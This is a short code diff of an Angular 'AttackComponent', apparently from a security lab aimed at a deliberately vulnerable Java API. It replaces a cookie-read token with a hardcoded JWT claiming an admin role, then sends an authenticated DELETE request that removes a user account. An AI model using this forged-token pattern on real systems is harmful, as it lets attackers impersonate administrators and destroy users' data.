@@ -10,7 +10,7 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    const token = this.getCookie("auth-token");
+    const token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhZHZvY2FjaWEtYXBpIiwic3ViIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJleHAiOjE3Mzg5MDU1ODF9.NU9nKVJoCxYxvthZpkQ-wKtffy4nB-rPgpGdgQpR2ok';
     const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
   
     this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
